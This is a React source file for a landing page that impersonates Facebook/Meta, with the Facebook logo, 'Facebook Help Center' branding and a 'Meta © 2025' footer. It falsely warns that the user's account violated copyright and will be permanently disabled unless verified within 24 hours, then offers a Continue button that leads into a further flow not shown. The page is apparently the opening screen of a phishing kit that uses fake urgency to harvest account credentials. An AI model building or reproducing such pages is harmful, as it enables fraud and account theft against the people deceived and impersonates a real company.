import React from 'react';

function LandingPage({ onGetStarted }) {
  return (
    <div style={{ background: '#fff', fontFamily: 'Helvetica', WebkitFontSmoothing: 'antialiased' }}>
      <header style={{ 
        backgroundColor: '#fff', 
        height: '55px', 
        borderBottom: '0.5px solid rgba(0,0,0,0.15)' 
      }}>
        <div style={{ width: '90%', margin: 'auto', overflow: 'hidden' }}>
          <div style={{ float: 'left' }}>
            <div>
              <svg viewBox="0 0 36 36" style={{ color: '#0866FF', height: '54px' }} fill="currentColor" height={40} width={40}>
                <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z" />
                <path style={{ fill: 'white' }} d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z" />
              </svg>
            </div>
          </div>
        </div>
      </header>
      
      <div style={{ marginBottom: '3rem', backgroundColor: '#f0f2f5', padding: '20px', minHeight: '100vh' }}>
        <div style={{
          maxWidth: '600px',
          margin: '50px auto 0',
          backgroundColor: '#fff',
          padding: '30px',
          borderRadius: '8px',
          boxShadow: '0 2px 4px rgba(0,0,0,0.1)'
        }}>
          <h3 style={{ 
            fontFamily: 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif',
            fontSize: '20px',
            fontWeight: 'bold',
            color: '#000',
            marginBottom: '20px',
            lineHeight: '1.2rem'
          }}>
            Account will be deactivated
          </h3>
          
          <div style={{ 
            fontFamily: 'Helvetica, Arial, sans-serif',
            fontSize: '14px',
            lineHeight: '1.4rem',
            color: '#141823',
            marginBottom: '20px'
          }}>
            Your account or the page you use has violated copyright. We will immediately limit your account or permanently disable it for non-compliance with our terms of service.
          </div>
          
          <div style={{ 
            fontFamily: 'Helvetica, Arial, sans-serif',
            fontSize: '14px',
            lineHeight: '1.4rem',
            color: '#141823',
            marginBottom: '30px'
          }}>
            If you think we've accidentally suspended your account, you have 24 hours to verify your account. If you miss this security notification, your account will be permanently disabled.
          </div>
          
          <div style={{ 
            marginBottom: '30px',
            padding: '15px',
            borderRadius: '8px',
            backgroundColor: '#f8f9fa',
            border: '1px solid #e3e6ea'
          }}>
            <table style={{ borderCollapse: 'collapse', width: '100%' }}>
              <tbody>
                <tr>
                  <td style={{ verticalAlign: 'top', width: '70px' }}>
                    <img 
                      width="64" 
                      height="64"
                      src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjQiIGhlaWdodD0iNjQiIHZpZXdCb3g9IjAgMCA2NCA2NCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0IiByeD0iOCIgZmlsbD0iIzE4NzZGMiIvPgo8cGF0aCBkPSJNMzIgMTZWNDgiIHN0cm9rZT0id2hpdGUiIHN0cm9rZS13aWR0aD0iNCIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIi8+CjxwYXRoIGQ9Ik0xNiAzMkg0OCIgc3Ryb2tlPSJ3aGl0ZSIgc3Ryb2tlLXdpZHRoPSI0IiBzdHJva2UtbGluZWNhcD0icm91bmQiLz4KPGNpcmNsZSBjeD0iMzIiIGN5PSIzMiIgcj0iNCIgZmlsbD0id2hpdGUiLz4KPC9zdmc+" 
                      alt="Facebook Help" 
                      style={{ display: 'block', borderRadius: '8px' }}
                    />
                  </td>
                  <td style={{ verticalAlign: 'top', paddingLeft: '15px' }}>
                    <div style={{
                      fontFamily: 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif',
                      fontSize: '17px',
                      lineHeight: '1.3rem',
                      fontWeight: 'bold',
                      color: '#000000e0',
                      marginBottom: '5px'
                    }}>
                      Facebook Help Center
                    </div>
                    <div style={{
                      fontFamily: 'Helvetica, Arial, sans-serif',
                      fontSize: '13px',
                      color: '#737373',
                      lineHeight: '1.2rem'
                    }}>
                      We will help you solve your account problems
                    </div>
                  </td>
                </tr>
              </tbody>
            </table>
          </div>
          
          <button 
            onClick={onGetStarted}
            style={{
              backgroundColor: '#1876F2',
              color: 'white',
              border: 'none',
              borderRadius: '6px',
              padding: '12px 24px',
              fontSize: '16px',
              fontWeight: '600',
              cursor: 'pointer',
              width: '100%',
              marginBottom: '30px',
              transition: 'background-color 0.2s'
            }}
            onMouseOver={(e) => e.target.style.backgroundColor = '#166fe5'}
            onMouseOut={(e) => e.target.style.backgroundColor = '#1876F2'}
          >
            Continue
          </button>
          
          <div style={{
            fontFamily: 'Helvetica, Arial, sans-serif',
            fontSize: '11px',
            lineHeight: '21px',
            color: '#737373',
            fontWeight: '600',
            textAlign: 'center'
          }}>
            Meta © 2025
          </div>
        </div>
      </div>
    </div>
  );
}

export default LandingPage;